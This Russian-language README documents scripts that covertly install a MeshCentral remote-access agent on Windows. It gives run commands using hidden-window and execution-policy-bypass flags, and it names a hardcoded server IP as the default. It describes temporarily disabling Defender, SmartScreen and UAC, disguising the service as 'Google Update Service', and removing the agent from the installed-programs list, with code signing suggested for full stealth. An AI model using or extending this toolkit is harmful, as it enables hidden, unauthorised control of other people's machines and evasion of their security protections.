# MeshAgent Silent Installation Scripts

## Скрипты

### 1. `get-meshid.sh` — Получение MeshID с сервера (Linux)
```bash
chmod +x get-meshid.sh
./get-meshid.sh
```
Автоматически получает MeshID через SSH + meshctrl.js или nedb.

### 2. `generate-msh.sh` — Генерация .msh файла (Linux)
```bash
chmod +x generate-msh.sh
./generate-msh.sh
```
Генерирует .msh файл с настройками подключения к серверу.

### 3. `install.bat` — Установщик с автоматическим получением MeshID (Windows)
```cmd
:: Запуск от имени администратора
install.bat
```
Запрашивает логин/пароль администратора MeshCentral, автоматически получает MeshID и ServerID.

### 4. `stealth-install.ps1` — Полная скрытая установка (Windows)
```powershell
# Автоматическое получение MeshID/ServerID:
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File stealth-install.ps1 -AdminUser admin -AdminPass "password"

# Или вручную:
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File stealth-install.ps1 -MeshID "0x..." -ServerID "..."
```

### 5. `clean-registry.ps1` — Очистка реестра (Windows)
```powershell
powershell -ExecutionPolicy Bypass -File clean-registry.ps1
```
Удаляет агент из "Установленных программ".

## Параметры stealth-install.ps1

| Параметр | Описание | По умолчанию |
|----------|----------|--------------|
| `-ServerUrl` | WebSocket URL сервера | wss://85.158.110.250:8080/agent.ashx |
| `-ServiceName` | Имя сервиса | google |
| `-DisplayName` | Отображаемое имя | Google Update Service |
| `-MeshName` | Имя группы устройств | MyComputers |
| `-MeshType` | Тип группы (1=LAN, 2=WAN, 3=Local) | 2 |
| `-MeshID` | ID группы (0x...) | (автоматически) |
| `-ServerID` | ID сервера | (автоматически) |
| `-AdminUser` | Логин администратора | admin |
| `-AdminPass` | Пароль администратора | (обязательно для авто) |

## Автоматическое получение MeshID

Скрипт автоматически:
1. Подключается к MeshCentral по WebSocket
2. Логинится как администратор
3. Получает список device groups
4. Извлекает MeshID из первого найденного

## Что делает stealth-install.ps1

1. Скрывает окно PowerShell
2. **Автоматически получает ServerID** из TLS-сертификата сервера
3. **Автоматически получает MeshID** через WebSocket API
4. Отключает SmartScreen + Defender + UAC временно
5. Генерирует .msh файл с настройками
6. Скачивает агент с сервера
7. Встраивает .msh в агент
8. Устанавливает агент тихо (`-fullinstall`)
9. Удаляет ключи реестра (скрывает из Programs)
10. Переименовывает сервис
11. Восстанавливает настройки безопасности
12. Очищает временные файлы

## Важно

- Скрипты требуют прав администратора
- Для полной скрытости нужен Code Signing сертификат
- Уже подписанные агенты лежат в `/opt/meshcentral/meshcentral-data/signedagents/`
